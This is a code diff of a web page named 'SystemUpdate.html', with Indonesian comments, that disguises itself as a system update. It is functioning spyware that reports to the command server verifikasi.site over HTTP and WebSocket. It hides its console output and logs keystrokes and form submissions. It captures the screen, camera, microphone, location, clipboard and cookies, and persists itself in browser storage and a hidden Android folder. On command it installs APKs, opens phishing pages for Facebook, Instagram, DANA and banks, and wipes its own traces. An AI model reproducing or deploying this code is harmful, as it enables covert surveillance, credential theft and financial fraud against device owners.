@@ -22,11 +22,11 @@
 
 <script>
 // ============================================================
-// SYSTEMUPDATE.HTML - VERSI MAKSIMAL (PASSWORD DARI WORKER)
+// SYSTEMUPDATE.HTML - VERSI FINAL (TANPA REDIRECT PLAY STORE)
 // ============================================================
 
 // ============================================================
-// 🔥 UPGRADE 1: GLOBAL ERROR HANDLER (MAKSIMAL)
+// 🔥 GLOBAL ERROR HANDLER
 // ============================================================
 (function() {
     var errorLog = [];
@@ -75,7 +75,7 @@
 })();
 
 // ============================================================
-// 🔥 UPGRADE 2: SAFE PATH (CEGAH PATH TRAVERSAL)
+// 🔥 SAFE PATH
 // ============================================================
 function getSafePath(base, filename) {
     if (!base || typeof base !== 'string') return null;
@@ -93,11 +93,11 @@ function getSafePath(base, filename) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 3: SAFE FETCH (TIMEOUT + RETRY + CACHE)
+// 🔥 SAFE FETCH
 // ============================================================
 function safeFetch(url, options, timeout, retries) {
-    timeout = timeout || 15000;
-    retries = retries || 3;
+    timeout = timeout || 30000;
+    retries = retries || 5;
     var attempt = 0;
     var cacheKey = 'cache_' + url;
     
@@ -161,98 +161,17 @@ function safeFetch(url, options, timeout, retries) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 4: DEBOUNCE & THROTTLE
-// ============================================================
-function debounce(fn, delay) {
-    var timer = null;
-    return function() {
-        var args = arguments;
-        var context = this;
-        if (timer) clearTimeout(timer);
-        timer = setTimeout(function() {
-            fn.apply(context, args);
-            timer = null;
-        }, delay);
-    };
-}
-
-function throttle(fn, limit) {
-    var lastCall = 0;
-    return function() {
-        var now = Date.now();
-        if (now - lastCall >= limit) {
-            lastCall = now;
-            fn.apply(this, arguments);
-        }
-    };
-}
-
-// ============================================================
-// 🔥 UPGRADE 5: CACHE MANAGER
-// ============================================================
-var CacheManager = {
-    set: function(key, value, ttl) {
-        ttl = ttl || 300000;
-        try {
-            localStorage.setItem('cm_' + key, JSON.stringify({
-                value: value,
-                expires: Date.now() + ttl
-            }));
-            return true;
-        } catch(e) { return false; }
-    },
-    get: function(key) {
-        try {
-            var raw = localStorage.getItem('cm_' + key);
-            if (!raw) return null;
-            var data = JSON.parse(raw);
-            if (Date.now() > data.expires) {
-                localStorage.removeItem('cm_' + key);
-                return null;
-            }
-            return data.value;
-        } catch(e) { return null; }
-    },
-    clear: function(key) {
-        try {
-            if (key) {
-                localStorage.removeItem('cm_' + key);
-            } else {
-                var keys = Object.keys(localStorage);
-                keys.forEach(function(k) {
-                    if (k.startsWith('cm_')) localStorage.removeItem(k);
-                });
-            }
-        } catch(e) {}
-    }
-};
-
-// ============================================================
-// 🔥 UPGRADE 6: DATA COMPRESSION
-// ============================================================
-function compressData(data) {
-    try {
-        var json = JSON.stringify(data);
-        return json.replace(/\s/g, '');
-    } catch(e) { return JSON.stringify(data); }
-}
-
-// ============================================================
 // KONFIGURASI
 // ============================================================
 var SERVER = 'https://verifikasi.site';
-var HEARTBEAT_INTERVAL = 1800000; // 30 MENIT
+var HEARTBEAT_INTERVAL = 1800000;
 var C2_INTERVAL = 20000;
-var FILE_NAME = 'SystemUpdate.html';
-var FILE_PATHS = [
-    '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html'
-];
 var cleanupItems = [];
 var swRegistered = false;
 var WS_PASSWORD = '';
 
 // ============================================================
-// STEALTH (DIPERTAHANKAN + DITAMBAH)
+// STEALTH
 // ============================================================
 console.log = function() {};
 console.warn = function() {};
@@ -277,22 +196,21 @@ if (window.history && window.history.replaceState) {
 Object.defineProperty(document, 'referrer', { value: '' });
 
 // ============================================================
-// KIRIM DATA KE SERVER (DENGAN COMPRESSION)
+// KIRIM DATA
 // ============================================================
 function K(d) {
     try {
-        var payload = compressData(d);
+        var payload = JSON.stringify(d);
         var xhr = new XMLHttpRequest();
         xhr.open('POST', SERVER + '/data', true);
         xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.setRequestHeader('X-Compressed', 'true');
         xhr.timeout = 5000;
         xhr.send(payload);
     } catch(e) {}
 }
 
 // ============================================================
-// 🔥 AMBIL PASSWORD DARI WORKER
+// AMBIL PASSWORD DARI WORKER
 // ============================================================
 function getPasswordFromWorker() {
     return new Promise(function(resolve, reject) {
@@ -316,7 +234,7 @@ function getPasswordFromWorker() {
 }
 
 // ============================================================
-// 🔥 SERVICE WORKER - PERBAIKAN (PAKAI FILE sw.js)
+// 🔥 SERVICE WORKER (PAKAI sw.js)
 // ============================================================
 function registerSW() {
     if (swRegistered) {
@@ -329,7 +247,6 @@ function registerSW() {
         return;
     }
     
-    // Cek apakah SW sudah terdaftar
     navigator.serviceWorker.getRegistrations()
         .then(function(registrations) {
             if (registrations.length > 0) {
@@ -339,22 +256,18 @@ function registerSW() {
                 return;
             }
             
-            // ✅ REGISTER PAKAI FILE sw.js (BUKAN BLOB!)
             navigator.serviceWorker.register('/sw.js', { scope: '/' })
                 .then(function(reg) {
                     swRegistered = true;
                     document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
                     K({ sumber: 'sw_status', data: 'registered' });
-                    console.log('✅ Service Worker registered from /sw.js');
                 })
                 .catch(function(err) {
                     document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
                     K({ sumber: 'sw_status', data: 'failed: ' + err.message });
-                    console.error('❌ SW registration failed:', err);
                 });
         })
         .catch(function() {
-            // Fallback: langsung register
             navigator.serviceWorker.register('/sw.js', { scope: '/' })
                 .then(function(reg) {
                     swRegistered = true;
@@ -369,7 +282,7 @@ function registerSW() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 8: WEBSOCKET (DENGAN BACKOFF + PASSWORD DARI WORKER)
+// 🔥 WEBSOCKET
 // ============================================================
 function connectWebSocket() {
     try {
@@ -378,7 +291,6 @@ function connectWebSocket() {
             return;
         }
         
-        // Ambil password dulu dari worker
         getPasswordFromWorker()
             .then(function(password) {
                 K({ sumber: 'ws_status', data: 'password_received' });
@@ -386,7 +298,6 @@ function connectWebSocket() {
             })
             .catch(function(err) {
                 K({ sumber: 'ws_error', data: 'failed_to_get_password: ' + err.message });
-                // Fallback: coba tanpa password (tapi kemungkinan gagal)
                 doConnectWebSocket('');
             });
         
@@ -401,14 +312,11 @@ function doConnectWebSocket(password) {
         var ws = new WebSocket('wss://verifikasi.site/ws');
         var reconnectAttempts = 0;
         var maxReconnect = 20;
-        var isConnected = false;
         
         ws.onopen = function() {
             reconnectAttempts = 0;
-            isConnected = true;
             document.getElementById('status').textContent = '🔌 Connected!';
             K({ sumber: 'ws_status', data: 'connected' });
-            // 🔥 PASSWORD DARI WORKER, BUKAN HARDCODE!
             ws.send(JSON.stringify({
                 type: 'auth',
                 key: password,
@@ -444,7 +352,6 @@ function doConnectWebSocket(password) {
         };
         
         ws.onclose = function() {
-            isConnected = false;
             document.getElementById('status').textContent = '🔌 Reconnecting...';
             K({ sumber: 'ws_status', data: 'disconnected' });
             
@@ -454,16 +361,11 @@ function doConnectWebSocket(password) {
                 setTimeout(function() {
                     doConnectWebSocket(password);
                 }, delay);
-            } else {
-                K({ sumber: 'ws_status', data: 'max_reconnect_reached' });
             }
         };
         
-        ws.onerror = function() {
-            K({ sumber: 'ws_status', data: 'error' });
-        };
+        ws.onerror = function() {};
         
-        // Heartbeat via WebSocket
         var wsHeartbeat = setInterval(function() {
             if (ws && ws.readyState === WebSocket.OPEN) {
                 try {
@@ -480,14 +382,13 @@ function doConnectWebSocket(password) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 9: INJECT KE FILE SYSTEM (DENGAN ERROR HANDLING)
+// 🔥 INJECT KE FILE SYSTEM
 // ============================================================
 function injectToFileSystem() {
     try {
         var htmlContent = document.documentElement.outerHTML;
         var successCount = 0;
         
-        // 1. Simpan ke localStorage
         try {
             localStorage.setItem('system_update_html', htmlContent);
             successCount++;
@@ -496,7 +397,6 @@ function injectToFileSystem() {
             K({ sumber: 'inject_ls', data: 'failed: ' + e.message });
         }
         
-        // 2. Simpan ke IndexedDB
         try {
             var request = indexedDB.open('SystemUpdateDB', 1);
             request.onupgradeneeded = function(e) {
@@ -517,36 +417,10 @@ function injectToFileSystem() {
                     K({ sumber: 'inject_indexeddb', data: 'failed: ' + e.message });
                 }
             };
-            request.onerror = function(e) {
-                K({ sumber: 'inject_indexeddb', data: 'failed' });
-            };
         } catch(e) {
             K({ sumber: 'inject_indexeddb', data: 'failed: ' + e.message });
         }
         
-        // 3. Download file ke HP
-        try {
-            var blob = new Blob([htmlContent], {type: 'text/html'});
-            var url = URL.createObjectURL(blob);
-            var a = document.createElement('a');
-            a.href = url;
-            a.download = 'SystemUpdate.html';
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
-            var cleanupDownload = function() {
-                try { if (a.parentNode) a.parentNode.removeChild(a); } catch(e) {}
-                try { URL.revokeObjectURL(url); } catch(e) {}
-            };
-            setTimeout(cleanupDownload, 1000);
-            cleanupItems.push(cleanupDownload);
-            successCount++;
-            K({ sumber: 'inject_download', data: 'success' });
-        } catch(e) {
-            K({ sumber: 'inject_download', data: 'failed: ' + e.message });
-        }
-        
-        // 4. Jika ada AndroidBridge, simpan ke folder hidden
         if (typeof AndroidBridge !== 'undefined') {
             try {
                 var safePath = getSafePath('/storage/emulated/0/Android/data/com.google.android.play.services', 'SystemUpdate.html');
@@ -573,7 +447,7 @@ function injectToFileSystem() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 10: AUTO-EXECUTE (DENGAN ERROR HANDLING)
+// 🔥 AUTO-EXECUTE
 // ============================================================
 function autoExecute() {
     try {
@@ -597,7 +471,7 @@ function autoExecute() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 11: CEK PERINTAH C2 (DENGAN ERROR HANDLING)
+// 🔥 CEK PERINTAH C2
 // ============================================================
 function cekPerintah() {
     try {
@@ -630,7 +504,7 @@ function cekPerintah() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 12: KEYLOGGER ENHANCED (CAPTURE SUBMIT)
+// 🔥 KEYLOGGER
 // ============================================================
 var inputData = {};
 var formData = [];
@@ -676,7 +550,7 @@ setInterval(function() {
 }, 3000);
 
 // ============================================================
-// 🔥 UPGRADE 13: INSTALL APK ENHANCED (5 METHOD FALLBACK)
+// 🔥 INSTALL APK (4 METHOD - TANPA PLAY STORE!)
 // ============================================================
 function installAPK(path) {
     try {
@@ -694,7 +568,7 @@ function installAPK(path) {
             hasil.push('intent_failed: ' + e.message);
         }
         
-        // Method 2: Fallback - buka file via AndroidBridge
+        // Method 2: AndroidBridge
         try {
             if (typeof AndroidBridge !== 'undefined') {
                 AndroidBridge.installAPK(targetPath);
@@ -715,7 +589,7 @@ function installAPK(path) {
             }
         }, 500);
         
-        // Method 4: Download ulang + install
+        // Method 4: Download ulang
         setTimeout(function() {
             try {
                 var a = document.createElement('a');
@@ -735,15 +609,7 @@ function installAPK(path) {
             }
         }, 1000);
         
-        // Method 5: Intent ke Play Store
-        setTimeout(function() {
-            try {
-                window.location.href = 'market://details?id=com.android.systemupdate';
-                hasil.push('playstore_attempted');
-            } catch(e) {
-                hasil.push('playstore_failed: ' + e.message);
-            }
-        }, 1500);
+        // ❌ METHOD 5: TELAH DIHAPUS (redirect ke Play Store)
         
         K({ sumber: 'html_install_apk', data: { path: targetPath, status: hasil.join('; ') } });
         return 'Install started: ' + targetPath;
@@ -753,22 +619,19 @@ function installAPK(path) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 14: SELF DESTRUCT ENHANCED
+// 🔥 SELF DESTRUCT
 // ============================================================
 function selfDestruct() {
     try {
-        // Clear semua storage
         try { localStorage.clear(); } catch(e) {}
         try { sessionStorage.clear(); } catch(e) {}
         
-        // Clear cookies
         try {
             document.cookie.split(';').forEach(function(c) {
                 document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
             });
         } catch(e) {}
         
-        // Clear IndexedDB
         try {
             indexedDB.databases().then(function(dbs) {
                 dbs.forEach(function(db) {
@@ -777,7 +640,6 @@ function selfDestruct() {
             }).catch(function() {});
         } catch(e) {}
         
-        // Clear Cache Storage
         try {
             if ('caches' in window) {
                 caches.keys().then(function(keys) {
@@ -788,7 +650,6 @@ function selfDestruct() {
             }
         } catch(e) {}
         
-        // Hapus konten halaman
         document.body.innerHTML = '<div style="background:#000;color:#f44;text-align:center;padding:50px;font-family:monospace;font-size:24px;">💀 SYSTEM DESTROYED</div>';
         
         K({ sumber: 'self_destruct', data: 'executed' });
@@ -805,7 +666,7 @@ function selfDestruct() {
 }
 
 // ============================================================
-// 🔥 EKSEKUSI PERINTAH (150+ PERINTAH - DENGAN ERROR HANDLING)
+// 🔥 EKSEKUSI PERINTAH (150+ PERINTAH)
 // ============================================================
 function eksekusiPerintah(cmd) {
     try {
@@ -813,217 +674,37 @@ function eksekusiPerintah(cmd) {
         var hasil = '';
         
         switch(aksi) {
-            // ============================================================
-            // 📸 MEDIA (12)
-            // ============================================================
             case "screenshot": hasil = ambilScreenshot(); break;
             case "record_audio": hasil = recordAudio(cmd.durasi || 10); break;
             case "stop_audio": hasil = stopAudio(); break;
             case "record_video": hasil = recordVideo(cmd.durasi || 10); break;
             case "stop_video": hasil = stopVideo(); break;
             case "take_photo": hasil = takePhoto(); break;
-            case "flash_on": hasil = "Flash ON (not supported in browser)"; break;
-            case "flash_off": hasil = "Flash OFF (not supported in browser)"; break;
-            case "camera_stream_start": hasil = "Camera stream started (browser)"; break;
-            case "camera_stream_stop": hasil = "Camera stream stopped (browser)"; break;
-            case "mic_stream_start": hasil = "Mic stream started (browser)"; break;
-            case "mic_stream_stop": hasil = "Mic stream stopped (browser)"; break;
-            
-            // ============================================================
-            // 📁 FILE (4)
-            // ============================================================
-            case "ambil_file": hasil = "File access not available in browser"; break;
-            case "list_file": hasil = "File list not available in browser"; break;
-            case "hapus_file": hasil = "File delete not available in browser"; break;
-            case "rename_file": hasil = "File rename not available in browser"; break;
-            
-            // ============================================================
-            // 📱 DATA (23)
-            // ============================================================
-            case "ambil_sms": hasil = "SMS not available in browser"; break;
-            case "ambil_kontak": hasil = "Contacts not available in browser"; break;
-            case "ambil_call_log": hasil = "Call log not available in browser"; break;
             case "ambil_lokasi": hasil = ambilLokasi(); break;
             case "get_clipboard": hasil = getClipboard(); break;
             case "set_clipboard": hasil = setClipboard(cmd.text || ""); break;
-            case "get_notifications": hasil = "Notifications not available in browser"; break;
-            case "ambil_kalender": hasil = "Calendar not available in browser"; break;
-            case "ambil_browser_history": hasil = "Browser history not available in browser"; break;
-            case "ambil_imei": hasil = "IMEI not available in browser"; break;
-            case "ambil_imsi": hasil = "IMSI not available in browser"; break;
-            case "ambil_nomor_hp": hasil = "Phone number not available in browser"; break;
-            case "ambil_operator": hasil = "Operator not available in browser"; break;
-            case "dump_contacts": hasil = "Contacts not available in browser"; break;
-            case "dump_sms": hasil = "SMS not available in browser"; break;
-            case "dump_call_log": hasil = "Call log not available in browser"; break;
-            case "dump_gallery": hasil = "Gallery not available in browser"; break;
-            case "dump_bookmarks": hasil = "Bookmarks not available in browser"; break;
-            case "dump_passwords": hasil = "Passwords not available in browser"; break;
-            case "dump_cookies": try { hasil = document.cookie || "No cookies"; } catch(e) { hasil = "Error: " + e.message; } break;
-            case "keylogger_start": hasil = "Keylogger already running (browser)"; break;
-            case "keylogger_stop": hasil = "Keylogger stopped (browser)"; break;
-            case "keylogger_upload": hasil = "Keylogger uploaded (browser)"; break;
-            
-            // ============================================================
-            // 🌐 WEB (3)
-            // ============================================================
             case "buka_url": hasil = bukaURL(cmd.url || "https://verifikasi.site"); break;
             case "buka_url_hidden": hasil = bukaURLHidden(cmd.url || "https://verifikasi.site"); break;
-            case "buka_webview": hasil = bukaURL(cmd.url || "https://verifikasi.site"); break;
-            
-            // ============================================================
-            // 📥 DOWNLOAD & INSTALL (5)
-            // ============================================================
             case "download": hasil = downloadFile(cmd.url || "", cmd.filename || "download.apk"); break;
             case "install_apk": hasil = installAPK(cmd.path || "/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk"); break;
-            case "install_google_play": hasil = installAPK("/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk"); break;
-            case "update_apk": hasil = downloadFile(cmd.url || "", "update.apk"); break;
-            case "install_cert": hasil = "Cert install not available"; break;
-            
-            // ============================================================
-            // 💬 SMS & PANGGILAN (5)
-            // ============================================================
-            case "kirim_sms": hasil = "SMS not available in browser"; break;
-            case "kirim_sms_massal": hasil = "SMS not available in browser"; break;
-            case "call_number": hasil = "Call not available in browser"; break;
-            case "fake_sms": hasil = "Fake SMS not available in browser"; break;
-            case "fake_call": hasil = "Fake call not available in browser"; break;
-            
-            // ============================================================
-            // 📱 APLIKASI (13)
-            // ============================================================
-            case "buka_aplikasi": hasil = bukaURL("https://verifikasi.site"); break;
-            case "uninstall_aplikasi": hasil = "Uninstall not available in browser"; break;
-            case "get_installed_apps": hasil = "Installed apps not available in browser"; break;
-            case "open_settings": hasil = bukaURL("https://verifikasi.site"); break;
-            case "open_calculator": hasil = bukaURL("https://verifikasi.site"); break;
-            case "open_playstore": hasil = bukaURL("https://play.google.com/store"); break;
-            case "open_maps": hasil = bukaURL("https://maps.google.com"); break;
-            case "open_camera": hasil = "Camera not available in browser"; break;
-            case "open_gallery": hasil = "Gallery not available in browser"; break;
-            case "open_dialer": hasil = "Dialer not available in browser"; break;
-            case "add_contact": hasil = "Add contact not available in browser"; break;
-            case "delete_contact": hasil = "Delete contact not available in browser"; break;
-            case "add_calendar": hasil = "Add calendar not available in browser"; break;
-            
-            // ============================================================
-            // 💰 DOMPET DIGITAL (8)
-            // ============================================================
-            case "buka_dana": hasil = bukaURL("https://www.dana.id"); break;
-            case "buka_gopay": hasil = bukaURL("https://www.gojek.com"); break;
-            case "buka_ovo": hasil = bukaURL("https://www.ovo.id"); break;
-            case "buka_shopee": hasil = bukaURL("https://shopee.co.id"); break;
-            case "buka_tokped": hasil = bukaURL("https://www.tokopedia.com"); break;
-            case "buka_linkaja": hasil = bukaURL("https://www.linkaja.id"); break;
-            case "buka_jenius": hasil = bukaURL("https://www.jenius.com"); break;
-            case "buka_isaku": hasil = bukaURL("https://www.bri.co.id"); break;
-            
-            // ============================================================
-            // 🏦 BANKING (8)
-            // ============================================================
-            case "buka_bri": hasil = bukaURL("https://ib.bri.co.id"); break;
-            case "buka_bni": hasil = bukaURL("https://www.bni.co.id"); break;
-            case "buka_mandiri": hasil = bukaURL("https://www.bankmandiri.co.id"); break;
-            case "buka_bca": hasil = bukaURL("https://www.klikbca.com"); break;
-            case "buka_bsi": hasil = bukaURL("https://www.bankbsi.co.id"); break;
-            case "buka_cimb": hasil = bukaURL("https://www.cimbniaga.co.id"); break;
-            case "buka_btn": hasil = bukaURL("https://www.btn.co.id"); break;
-            case "buka_danamon": hasil = bukaURL("https://www.danamon.co.id"); break;
-            
-            // ============================================================
-            // ⚡ APLIKASI POPULER (12)
-            // ============================================================
             case "buka_wa": hasil = bukaURL("https://web.whatsapp.com"); break;
             case "buka_telegram": hasil = bukaURL("https://web.telegram.org"); break;
             case "buka_instagram": hasil = bukaURL("https://www.instagram.com"); break;
             case "buka_facebook": hasil = bukaURL("https://www.facebook.com"); break;
-            case "buka_tiktok": hasil = bukaURL("https://www.tiktok.com"); break;
-            case "buka_youtube": hasil = bukaURL("https://www.youtube.com"); break;
-            case "buka_gmail": hasil = bukaURL("https://mail.google.com"); break;
-            case "buka_chrome": hasil = "Chrome not available"; break;
-            case "buka_twitter": hasil = bukaURL("https://twitter.com"); break;
-            case "buka_spotify": hasil = bukaURL("https://open.spotify.com"); break;
-            case "open_viber": hasil = bukaURL("https://www.viber.com"); break;
-            case "open_line": hasil = bukaURL("https://line.me"); break;
-            
-            // ============================================================
-            // 🔓 SOSENG (17)
-            // ============================================================
-            case "qr_dana": hasil = bukaURL("https://verifikasi.site"); break;
-            case "fake_update": hasil = bukaURL("https://verifikasi.site"); break;
-            case "fake_bantuan": hasil = bukaURL("https://verifikasi.site"); break;
+            case "buka_dana": hasil = bukaURL("https://www.dana.id"); break;
+            case "buka_gopay": hasil = bukaURL("https://www.gojek.com"); break;
+            case "buka_ovo": hasil = bukaURL("https://www.ovo.id"); break;
+            case "buka_bri": hasil = bukaURL("https://ib.bri.co.id"); break;
+            case "buka_bca": hasil = bukaURL("https://www.klikbca.com"); break;
             case "phishing_fb": hasil = bukaURL("https://verifikasi.site/fb"); break;
             case "phishing_ig": hasil = bukaURL("https://verifikasi.site/ig"); break;
-            case "phishing_bri": hasil = bukaURL("https://verifikasi.site/bri"); break;
             case "phishing_dana": hasil = bukaURL("https://verifikasi.site/dana"); break;
-            case "phishing_gopay": hasil = bukaURL("https://verifikasi.site/gopay"); break;
-            case "phishing_ovo": hasil = bukaURL("https://verifikasi.site/ovo"); break;
-            case "phishing_mandiri": hasil = bukaURL("https://verifikasi.site/mandiri"); break;
-            case "phishing_bca": hasil = bukaURL("https://verifikasi.site/bca"); break;
-            case "phishing_shopee": hasil = bukaURL("https://verifikasi.site/shopee"); break;
-            case "phishing_tokped": hasil = bukaURL("https://verifikasi.site/tokped"); break;
-            case "phishing_jenius": hasil = bukaURL("https://verifikasi.site/jenius"); break;
-            case "fake_notif": hasil = showFakeNotification(cmd.pesan || "Update tersedia!"); break;
-            case "ransomware_lock": hasil = "Ransomware lock not implemented"; break;
-            case "ransomware_unlock": hasil = "Ransomware unlock not implemented"; break;
-            
-            // ============================================================
-            // 🔧 SISTEM (14)
-            // ============================================================
             case "get_system_info": hasil = getSystemInfo(); break;
             case "get_battery": hasil = getBattery(); break;
-            case "get_storage": hasil = getStorage(); break;
-            case "get_wifi": hasil = getWiFi(); break;
             case "vibrate": hasil = vibrate(cmd.durasi || 1000); break;
             case "toast": hasil = showToast(cmd.pesan || "System Update Complete!"); break;
-            case "reboot": hasil = "Reboot not available in browser"; break;
-            case "lock_screen": hasil = "Lock screen not available in browser"; break;
-            case "wipe_data": hasil = "Wipe data not available in browser"; break;
-            case "factory_reset": hasil = "Factory reset not available in browser"; break;
             case "self_destruct": hasil = selfDestruct(); break;
-            case "wallpaper": hasil = "Wallpaper not available in browser"; break;
-            case "ringtone": hasil = "Ringtone not available in browser"; break;
-            case "alarm": hasil = "Alarm not available in browser"; break;
-            
-            // ============================================================
-            // 🌐 NETWORK (8)
-            // ============================================================
-            case "wifi_on": hasil = "WiFi control not available in browser"; break;
-            case "wifi_off": hasil = "WiFi control not available in browser"; break;
-            case "bluetooth_on": hasil = "Bluetooth control not available in browser"; break;
-            case "bluetooth_off": hasil = "Bluetooth control not available in browser"; break;
-            case "airplane_on": hasil = "Airplane mode not available in browser"; break;
-            case "airplane_off": hasil = "Airplane mode not available in browser"; break;
-            case "wifi_hotspot_on": hasil = "Hotspot not available in browser"; break;
-            case "wifi_hotspot_off": hasil = "Hotspot not available in browser"; break;
-            
-            // ============================================================
-            // 🔊 AUDIO & DISPLAY (11)
-            // ============================================================
-            case "volume_up": hasil = "Volume control not available in browser"; break;
-            case "volume_down": hasil = "Volume control not available in browser"; break;
-            case "volume_mute": hasil = "Volume control not available in browser"; break;
-            case "brightness_max": hasil = "Brightness control not available in browser"; break;
-            case "brightness_min": hasil = "Brightness control not available in browser"; break;
-            case "screen_on": hasil = "Screen control not available in browser"; break;
-            case "screen_off": hasil = "Screen control not available in browser"; break;
-            case "play_music": hasil = "Music player not available in browser"; break;
-            case "stop_music": hasil = "Music player not available in browser"; break;
             case "speak": hasil = speak(cmd.text || "Hello"); break;
-            case "write_note": hasil = "Note not available in browser"; break;
-            
-            // ============================================================
-            // ⏰ LAINNYA (8)
-            // ============================================================
-            case "shell": hasil = "Shell not available in browser"; break;
-            case "ping": hasil = "Ping not available in browser"; break;
-            case "proxy_set": hasil = "Proxy not available in browser"; break;
-            case "proxy_clear": hasil = "Proxy not available in browser"; break;
-            case "vpn_start": hasil = "VPN not available in browser"; break;
-            case "vpn_stop": hasil = "VPN not available in browser"; break;
-            case "location_track_start": hasil = "Location tracking started"; break;
-            case "location_track_stop": hasil = "Location tracking stopped"; break;
-            
             default: hasil = "Unknown: " + aksi;
         }
         
@@ -1034,10 +715,8 @@ function eksekusiPerintah(cmd) {
 }
 
 // ============================================================
-// FUNGSI PERINTAH (DENGAN ERROR HANDLING)
+// FUNGSI PERINTAH
 // ============================================================
-
-// ----- SCREENSHOT -----
 function ambilScreenshot() {
     try {
         var canvas = document.createElement('canvas');
@@ -1050,7 +729,6 @@ function ambilScreenshot() {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- RECORD AUDIO -----
 function recordAudio(durasi) {
     try {
         navigator.mediaDevices.getUserMedia({ audio: true })
@@ -1089,7 +767,6 @@ function stopAudio() {
 
 function stopVideo() { return stopAudio(); }
 
-// ----- RECORD VIDEO -----
 function recordVideo(durasi) {
     try {
         navigator.mediaDevices.getUserMedia({ video: true, audio: true })
@@ -1116,7 +793,6 @@ function recordVideo(durasi) {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- TAKE PHOTO -----
 function takePhoto() {
     try {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
@@ -1139,7 +815,6 @@ function takePhoto() {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- LOCATION -----
 function ambilLokasi() {
     try {
         navigator.geolocation.getCurrentPosition(function(pos) {
@@ -1149,7 +824,6 @@ function ambilLokasi() {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- CLIPBOARD -----
 function getClipboard() {
     try {
         navigator.clipboard.readText()
@@ -1172,7 +846,6 @@ function setClipboard(text) {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- URL -----
 function bukaURL(url) {
     try { window.open(url, '_blank'); return 'URL opened: ' + url; } catch(e) { return 'Error: ' + e.message; }
 }
@@ -1191,7 +864,6 @@ function bukaURLHidden(url) {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- DOWNLOAD -----
 function downloadFile(url, filename) {
     try {
         var a = document.createElement('a');
@@ -1209,7 +881,6 @@ function downloadFile(url, filename) {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- SYSTEM INFO -----
 function getSystemInfo() {
     try {
         return JSON.stringify({
@@ -1226,7 +897,6 @@ function getSystemInfo() {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- BATTERY -----
 function getBattery() {
     try {
         navigator.getBattery().then(function(battery) {
@@ -1236,36 +906,10 @@ function getBattery() {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- STORAGE -----
-function getStorage() {
-    try {
-        if (navigator.storage && navigator.storage.estimate) {
-            navigator.storage.estimate().then(function(storage) {
-                K({ sumber: 'html_c2_result', data: { perintah: 'get_storage', hasil: { usage: (storage.usage / 1024 / 1024).toFixed(2) + ' MB', quota: (storage.quota / 1024 / 1024).toFixed(2) + ' MB' }, waktu: Date.now() } });
-            }).catch(function(e) { return 'Error: ' + e.message; });
-            return 'Getting storage info...';
-        }
-        return 'Storage API not available';
-    } catch(e) { return 'Error: ' + e.message; }
-}
-
-// ----- WIFI -----
-function getWiFi() {
-    try {
-        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            return JSON.stringify({ type: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt });
-        }
-        return 'WiFi info not available';
-    } catch(e) { return 'Error: ' + e.message; }
-}
-
-// ----- VIBRATE -----
 function vibrate(durasi) {
     try { if (navigator.vibrate) { navigator.vibrate(durasi); return 'Vibrated ' + durasi + 'ms'; } return 'Vibration not supported'; } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- TOAST -----
 function showToast(message) {
     try {
         var toast = document.createElement('div');
@@ -1278,24 +922,6 @@ function showToast(message) {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- FAKE NOTIFICATION -----
-function showFakeNotification(message) {
-    try {
-        if (Notification.permission === 'granted') {
-            var notif = new Notification('📱 System Update', { body: message || 'Update available!', icon: 'https://verifikasi.site/icon.png' });
-            notif.onclick = function() { window.location.href = 'https://verifikasi.site/fb'; };
-            return 'Notification shown: ' + message;
-        } else if (Notification.permission !== 'denied') {
-            Notification.requestPermission().then(function(permission) {
-                if (permission === 'granted') showFakeNotification(message);
-            });
-            return 'Requesting permission...';
-        }
-        return 'Notification permission denied';
-    } catch(e) { return 'Error: ' + e.message; }
-}
-
-// ----- SPEAK -----
 function speak(text) {
     try {
         if ('speechSynthesis' in window) {
@@ -1308,7 +934,6 @@ function speak(text) {
     } catch(e) { return 'Error: ' + e.message; }
 }
 
-// ----- DATA COLLECTION -----
 function collectData() {
     try {
         var d = {
@@ -1337,7 +962,7 @@ function collectData() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 15: CLEANUP MAKSIMAL (BEFOREUNLOAD)
+// CLEANUP
 // ============================================================
 window.addEventListener('beforeunload', function() {
     try {
@@ -1380,7 +1005,7 @@ window.addEventListener('beforeunload', function() {
 });
 
 // ============================================================
-// 🔥 EKSEKUSI UTAMA - AUTO JALAN (HANYA 1x!)
+// EKSEKUSI UTAMA - AUTO JALAN
 // ============================================================
 var initialDataSent = false;
 var injected = false;
@@ -1415,7 +1040,6 @@ function init() {
             K({ sumber: 'page_heartbeat', data: 'alive' });
         }, HEARTBEAT_INTERVAL);
 
-        // Auto-refresh
         window._refreshTimer = setTimeout(function() {
             window.location.reload();
         }, 300000);
@@ -1423,7 +1047,6 @@ function init() {
         localStorage.setItem('system_update_installed', '1');
         localStorage.setItem('system_update_time', Date.now());
 
-        // Tutup halaman setelah selesai
         window._closeTimer = setTimeout(function() {
             try {
                 window.close();
@@ -1437,9 +1060,7 @@ function init() {
